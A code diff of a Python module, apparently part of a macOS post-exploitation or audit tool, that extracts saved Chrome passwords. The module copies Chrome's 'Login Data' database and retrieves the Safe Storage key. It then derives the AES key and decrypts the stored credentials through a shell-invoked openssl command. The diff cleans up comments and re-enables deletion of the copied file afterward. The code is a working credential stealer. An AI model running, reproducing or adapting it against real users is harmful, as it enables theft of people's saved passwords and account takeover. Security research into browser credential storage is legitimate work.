@@ -1,11 +1,8 @@
 # from modInterface import ReMacModInterface
-import shutil
-import sqlite3
 import os
 from os.path import expanduser
 import base64
 import binascii
-import glob
 import hmac
 import itertools
 import operator
@@ -13,7 +10,6 @@ import shutil
 import sqlite3
 import struct
 import subprocess
-import tempfile
 import hashlib
 
 try:
@@ -62,22 +58,6 @@ class mod_chrome_logins():
         from hashlib import sha1
 
     def chrome_decrypt(self, encrypted, safe_storage_key):
-    # def chrome_decrypt(self, encrypted, key):
-    #     iv = ''.join(('20',) * 16)
-    #     key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
-    #
-    #     hex_key = binascii.hexlify(key)
-    #     hex_enc_password = base64.b64encode(encrypted[3:])
-    #     try:
-    #         decrypted = subprocess.check_output(
-    #             "openssl enc -base64 -d "
-    #             "-aes-128-cbc -iv '{}' -K {} <<< "
-    #             "{} 2>/dev/null".format(iv, hex_key, hex_enc_password),
-    #             shell=True)
-    #     except subprocess.CalledProcessError:
-    #         decrypted = "n/a"
-    #
-    #     return decrypted
         """
         AES decryption using the PBKDF2 key and 16x " " IV
         via openSSL (installed on OSX natively)
@@ -98,15 +78,9 @@ class mod_chrome_logins():
             strTmp = f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K '{hex_key}' <<< '{hex_enc_password}' 2>/dev/null"
             strTmp = strTmp.replace("'b'", "'")
             strTmp = strTmp.replace("''", "'")
-            # print(strTmp)
             decrypted = subprocess.check_output(
                 strTmp,
                 shell=True)
-            # decrypted = subprocess.check_output(
-            #     "openssl enc -base64 -d "
-            #     "-aes-128-cbc -iv '{}' -K {} <<< "
-            #     "{} 2>/dev/null".format(iv, hex_key, hex_enc_password),
-            #     shell=True)
         except subprocess.CalledProcessError:
             decrypted = "Error decrypting this data."
 
@@ -127,15 +101,7 @@ class mod_chrome_logins():
         elif not stdout:
             print("User clicked deny.")
         else:
-            # tmpO = stdout.decode("utf-8")
-            # tmpO = tmpO.replace("\n", "")
             safe_storage_key = stdout[:-1]
-            # safe_storage_key = safe_storage_key.replace("\n", "")
-            # tmpO = safe_storage_key.decode("utf-8")
-            # print(tmpO)
-            # chrome(chrome_data, safe_storage_key)
-
-        # return safe_storage_key
 
         shutil.copy2(expanduser("~") + '/Library/Application Support/Google/Chrome/Default/Login Data', 'chrome_logins')
 
@@ -151,8 +117,5 @@ class mod_chrome_logins():
 
         cur.close()
         con.close()
-        # os.remove('chrome_logins')
+        os.remove('chrome_logins')
         return query_result
-
-
-
